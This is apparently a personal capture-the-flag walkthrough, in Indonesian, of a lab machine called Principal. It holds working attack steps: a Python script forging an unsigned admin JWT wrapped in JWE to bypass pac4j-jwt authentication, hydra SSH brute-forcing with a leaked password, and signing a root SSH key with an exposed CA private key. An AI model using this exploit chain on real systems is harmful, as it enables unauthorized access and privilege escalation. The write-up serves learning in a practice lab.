
# Machine - Principal
- note: beberapa aku pakai AI disini
- and juga aku pakai clue2 hint dari guide mode
- jadi ada beberapa yang ga murni
- aku menulis ini buat catatan kedepannya aja sih 
- biar ingat sama pattern2 exploitnya juga

# user.txt - User Flag Process

## Enum 

### Nmap output - Scanning Services
```bash
# Nmap 7.95 scan initiated Tue Mar 31 21:18:14 2026 as: /usr/lib/nmap/nmap --privileged -sCV --min-rate 1000 -oN scan.nmap -p- 10.129.15.120
Warning: 10.129.15.120 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.15.120
Host is up (0.15s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp  open     http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Tue, 31 Mar 2026 14:21:10 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-03-31T14:21:10.088+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Date: Tue, 31 Mar 2026 14:21:07 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 31 Mar 2026 14:21:08 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Tue, 31 Mar 2026 14:21:09 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 505 Unknown Version</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 31 Mar 2026 14:21:10 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 31 21:21:35 2026 -- 1 IP address (1 host up) scanned in 201.25 seconds
```
- bagian sini ada sus
```bash
X-Powered-By: pac4j-jwt/6.0.3
```
- cari di google nanti: pac4j-jwt 6.0.3 exploit

### Gobuster dir output - Fuzz dir
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.15.120:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/tomba/wordlists/seclists/web-content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

[2K/META-INF             (Status: 500) [Size: 0]

[2K/WEB-INF              (Status: 500) [Size: 0]

[2K/api/experiments/configurations (Status: 401) [Size: 58]

[2K/api/experiments      (Status: 401) [Size: 58]

[2K/dashboard            (Status: 200) [Size: 3930]

[2K/error                (Status: 500) [Size: 73]

[2K/login                (Status: 200) [Size: 6152]

[2K/meta-inf             (Status: 500) [Size: 0]

[2K/render/https://www.google.com (Status: 400) [Size: 381]

[2K/web-inf              (Status: 500) [Size: 0]

===============================================================
Finished
===============================================================
```
- doi ada /api, catat

### Web enum
- kunjungi aja webnya, ip:8080
- footer web :8080
```bash
Principal Corp © 2025. Internal use only. v1.2.0 | Powered by pac4j
```
- ctrl + u web nya, baca source code
- baca js nya di script, /static/js/app.js
- wget aja, ada endpoint2 apinya
```js
/**
 * Principal Internal Platform - Client Application
 * Version: 1.2.0
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';

// Role constants - must match server-side role definitions
const ROLES = {
    ADMIN: 'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER: 'ROLE_USER'
};

// Token management
class TokenManager {
    static getToken() {
        return sessionStorage.getItem('auth_token');
    }

    static setToken(token) {
        sessionStorage.setItem('auth_token', token);
    }

    static clearToken() {
        sessionStorage.removeItem('auth_token');
    }

    static isAuthenticated() {
        return !!this.getToken();
    }

    static getAuthHeaders() {
        const token = this.getToken();
        return token ? { 'Authorization': `Bearer ${token}` } : {};
    }
}

// API client
class ApiClient {
    static async request(endpoint, options = {}) {
        const defaults = {
            headers: {
                'Content-Type': 'application/json',
                ...TokenManager.getAuthHeaders()
            }
        };

        const config = { ...defaults, ...options, headers: { ...defaults.headers, ...options.headers } };

        try {
            const response = await fetch(`${API_BASE}${endpoint}`, config);

            if (response.status === 401) {
                TokenManager.clearToken();
                if (window.location.pathname !== '/login') {
                    window.location.href = '/login';
                }
                throw new Error('Authentication required');
            }

            return response;
        } catch (error) {
            if (error.message === 'Authentication required') throw error;
            throw new Error('Network error. Please try again.');
        }
    }

    static async get(endpoint) {
        return this.request(endpoint);
    }

    static async post(endpoint, data) {
        return this.request(endpoint, {
            method: 'POST',
            body: JSON.stringify(data)
        });
    }

    /**
     * Fetch JWKS for token verification
     * Used by client-side token inspection utilities
     */
    static async fetchJWKS() {
        const response = await fetch(JWKS_ENDPOINT);
        return response.json();
    }
}

/**
 * Render dashboard navigation based on user role.
 * Admin users (ROLE_ADMIN) get access to user management and system settings.
 * Managers (ROLE_MANAGER) get read-only access to team dashboards.
 * Regular users (ROLE_USER) only see their own deployment panel.
 */
function renderNavigation(role) {
    const navItems = [
        { label: 'Dashboard', endpoint: DASHBOARD_ENDPOINT, roles: [ROLES.ADMIN, ROLES.MANAGER, ROLES.USER] },
        { label: 'Users', endpoint: USERS_ENDPOINT, roles: [ROLES.ADMIN] },
        { label: 'Settings', endpoint: SETTINGS_ENDPOINT, roles: [ROLES.ADMIN] },
    ];

    return navItems.filter(item => item.roles.includes(role));
}

// Login form handler
function initLoginForm() {
    const form = document.getElementById('loginForm');
    if (!form) return;

    // Redirect if already authenticated
    if (TokenManager.isAuthenticated()) {
        window.location.href = '/dashboard';
        return;
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        const errorEl = document.getElementById('errorMessage');
        const btnText = document.querySelector('.btn-text');
        const btnLoading = document.querySelector('.btn-loading');
        const loginBtn = document.getElementById('loginBtn');

        // Reset error
        errorEl.style.display = 'none';

        if (!username || !password) {
            showError('Please enter both username and password.');
            return;
        }

        // Show loading state
        loginBtn.disabled = true;
        btnText.style.display = 'none';
        btnLoading.style.display = 'flex';

        try {
            const response = await ApiClient.post(AUTH_ENDPOINT, { username, password });
            const data = await response.json();

            if (response.ok) {
                TokenManager.setToken(data.token);
                // Token is JWE encrypted - decryption handled server-side
                // JWKS at /api/auth/jwks provides the encryption public key
                window.location.href = '/dashboard';
            } else {
                showError(data.message || 'Authentication failed. Please check your credentials.');
            }
        } catch (error) {
            showError(error.message || 'An error occurred. Please try again.');
        } finally {
            loginBtn.disabled = false;
            btnText.style.display = 'inline';
            btnLoading.style.display = 'none';
        }
    });
}

function showError(message) {
    const errorEl = document.getElementById('errorMessage');
    errorEl.textContent = message;
    errorEl.style.display = 'flex';
}

function togglePassword() {
    const input = document.getElementById('password');
    input.type = input.type === 'password' ? 'text' : 'password';
}

// Dashboard page handler
async function initDashboard() {
    const container = document.getElementById('dashboardApp');
    if (!container) return;

    if (!TokenManager.isAuthenticated()) {
        window.location.href = '/login';
        return;
    }

    try {
        const resp = await ApiClient.get(DASHBOARD_ENDPOINT);
        if (!resp.ok) throw new Error('Failed to load dashboard');
        const data = await resp.json();

        const user = data.user;
        const stats = data.stats;

        document.getElementById('welcomeUser').textContent = user.username;
        document.getElementById('userRole').textContent = user.role;

        // Stats cards
        document.getElementById('statUsers').textContent = stats.totalUsers;
        document.getElementById('statDeploys').textContent = stats.activeDeployments;
        document.getElementById('statHealth').textContent = stats.systemHealth;
        document.getElementById('statUptime').textContent = stats.uptimePercent + '%';

        // Build navigation based on role
        const nav = renderNavigation(user.role);
        const navEl = document.getElementById('sideNav');
        navEl.innerHTML = nav.map(item =>
            `<a href="#" class="nav-item" data-endpoint="${item.endpoint}">${item.label}</a>`
        ).join('');

        navEl.querySelectorAll('.nav-item').forEach(el => {
            el.addEventListener('click', async (e) => {
                e.preventDefault();
                navEl.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
                el.classList.add('active');
                await loadPanel(el.dataset.endpoint);
            });
        });

        // Mark first nav active
        const firstNav = navEl.querySelector('.nav-item');
        if (firstNav) firstNav.classList.add('active');

        // Activity log
        const logBody = document.getElementById('activityLog');
        logBody.innerHTML = data.recentActivity.map(a =>
            `<tr><td>${a.timestamp}</td><td><span class="badge badge-${a.action.includes('FAIL') ? 'danger' : 'info'}">${a.action}</span></td><td>${a.username}</td><td>${a.details}</td></tr>`
        ).join('');

        // Announcements
        const announcementsEl = document.getElementById('announcements');
        announcementsEl.innerHTML = data.announcements.map(a =>
            `<div class="announcement ${a.severity}"><strong>${a.title}</strong><p>${a.message}</p><small>${a.date}</small></div>`
        ).join('');

    } catch (err) {
        console.error('Dashboard load error:', err);
    }
}

async function loadPanel(endpoint) {
    const panel = document.getElementById('contentPanel');
    try {
        const resp = await ApiClient.get(endpoint);
        const data = await resp.json();

        if (resp.status === 403) {
            panel.innerHTML = `<div class="panel-error"><h3>Access Denied</h3><p>${data.message}</p></div>`;
            return;
        }

        if (endpoint === USERS_ENDPOINT) {
            panel.innerHTML = `<h3>User Management</h3><table class="data-table"><thead><tr><th>Username</th><th>Name</th><th>Role</th><th>Department</th><th>Status</th><th>Notes</th></tr></thead><tbody>${
                data.users.map(u => `<tr><td>${u.username}</td><td>${u.displayName}</td><td><span class="badge">${u.role}</span></td><td>${u.department}</td><td>${u.active ? '<span class="badge badge-success">Active</span>' : '<span class="badge badge-danger">Disabled</span>'}</td><td>${u.note}</td></tr>`).join('')
            }</tbody></table>`;
        } else if (endpoint === SETTINGS_ENDPOINT) {
            panel.innerHTML = `<h3>System Settings</h3>
                <div class="settings-grid">
                    <div class="settings-section"><h4>System</h4><dl>${Object.entries(data.system).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                    <div class="settings-section"><h4>Security</h4><dl>${Object.entries(data.security).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                    <div class="settings-section"><h4>Infrastructure</h4><dl>${Object.entries(data.infrastructure).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                </div>`;
        } else {
            panel.innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
        }
    } catch (err) {
        panel.innerHTML = `<div class="panel-error">Error loading data</div>`;
    }
}

function logout() {
    TokenManager.clearToken();
    window.location.href = '/login';
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initLoginForm();
    initDashboard();

    // Prefetch JWKS for token handling
    if (window.location.pathname === '/login') {
        ApiClient.fetchJWKS().then(jwks => {
            // Cache JWKS for client-side token operations
            window.__jwks = jwks;
        }).catch(() => {
            // JWKS fetch is non-critical for login flow
        });
    }
});
```

## CVE-2026-29000 - The pac4j-jwt Authentication Bypass That Let Public Keys Become Login Keys
- bagian sini vuln
```js
const JWKS_ENDPOINT = '/api/auth/jwks';
```
- cek dulu, http://10.129.15.120:8080/api/auth/jwks
```bash
curl http://10.129.15.120:8080/api/auth/jwks 

- output:
{
    "keys":[
        {
        "kty":"RSA",
        "e":"AQAB",
        "kid":"enc-key-1",
        "n":"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
        }
    ]
}
```
### Crafting Token with Py Script
- copas aja docs dari CVE nya, 
- copas juga output dari jwks, output dari script js nya
- tempel ke ai, suruh bikinin script nya
- buat jwe_script.py
```py
from jwcrypto import jwk, jwe
import json, base64, time

# === helper base64url tanpa padding ===
def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

# === public key dari JWKS ===
pubkey = jwk.JWK.from_json('''{
  "kty":"RSA",
  "n":"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw",
  "e":"AQAB"
}''')

# === payload JWT ===
now = int(time.time())

claims = {
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": now,
    "exp": now + 3600
}

# === HEADER JWT (PENTING: alg none) ===
header = {
    "alg": "none"
}

# === bikin PlainJWT: header.payload. ===
header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps(claims, separators=(",", ":")).encode())

plain_jwt = f"{header_b64}.{payload_b64}."

print("[+] PlainJWT:", plain_jwt)

# === encrypt jadi JWE ===
jwetoken = jwe.JWE(
    plaintext=plain_jwt.encode(),
    protected={
        "alg": "RSA-OAEP-256",
        "enc": "A256GCM"   # samain sama writeup (lebih aman)
    }
)

jwetoken.add_recipient(pubkey)

final_token = jwetoken.serialize(compact=True)

print("\n[+] FINAL TOKEN:")
print(final_token)
```
- run scriptnya
```bash
python3 jwe_script.py
```
### Inject token into browser
- udah jadi scriptnya, lanjut ke inspect element webnya
- nah nanti baca source code app.js, dia nanti ada ini // Token management
- cek disitu ada code tentang session storage auth_token
```js
class TokenManager {
    static getToken() {
        return sessionStorage.getItem('auth_token');
    }

    static setToken(token) {
        sessionStorage.setItem('auth_token', token);
    }

    static clearToken() {
        sessionStorage.removeItem('auth_token');
    }

    static isAuthenticated() {
        return !!this.getToken();
    }

    static getAuthHeaders() {
        const token = this.getToken();
        return token ? { 'Authorization': `Bearer ${token}` } : {};
    }
}
```
- langsung aja ke console devtools
- and ketik aja 
```js
sessionStorage.setItem("auth_token", [output_script])
```
- nah kalau gabisa paste, di console browsernya ketik gini
```js
'allow pasting'
```
- terus enter aja kalau udah
- lalu coba paste output ke sessionStorage set item
- kalau udah refresh page nya nanti bisa

### Enum Dashboard
- di dashboard check setting, a
- ada kayak pass gitu, nah user nya gatau
- coba cek di dashboard users,
- buat wordlist buat nama2 nya dan brute aja pakai hydra
```bash
hydra -L users.txt -p 'D3pl0y_$$H_Now42!' [ip] ssh -V
```
- dapet and login aja lewat ssh
- klaim user flag



# root.txt - Root Flag Process

### Enum Machines
- id, nanti dia ada di grup deployers
```bash
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```
- cek2 file yang ada access dari groups deployers
- /opt, /tmp/ /home/user, ls -la semuanya
## SSH CA Discovery
- ada di /opt/principal/ssh, disitu ada ca.pub dan ca
- baca2 guide mode, katanya ini
```txt
Which file contains a custom sshd configuration for Principal?
```
- biasanya kan ada di /etc/ssh/sshd_config
- jadi cat aja
```bash
cat /etc/ssh/sshd_config
```
- ternyata salah
- kata chatgpt modern openssh support disini 
- cat /etc/ssh/sshd_config.d, jadi coba ls disitu
- dan ternyata ada
```bash
ls /etc/ssh/sshd_config.d
```
### SSH Config Analysis
- cat aja file 60-principal.conf
```bash
svc-deploy@principal:/etc/ssh/sshd_config.d$ cat 60-principal.conf 


# Principal machine SSH configuration 
PubkeyAuthentication yes PasswordAuthentication yes 
PermitRootLogin prohibit-password 
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```
- cat aja dah ca nya
```bash
cat /opt/principal/ssh/ca
```
- terus copas jadi id_rsa
- di mesin mu
```bash
[copy /opt/principal/ssh/ca]

vim id_rsa (paste di file ini yg atas tuh)
chmod +x id_rsa
```
### generate ssh key:
```bash
ssh-keygen -t ed25519 -f nasgor_pub
```
### Sign Key with CA
```bash
ssh-keygen -s id_rsa -I nasgor_in -n root nasgor_pub
```
- ssh as root
```bash
ssh -i nasgor_pub root@10.129.15.120
```
- klaim root  

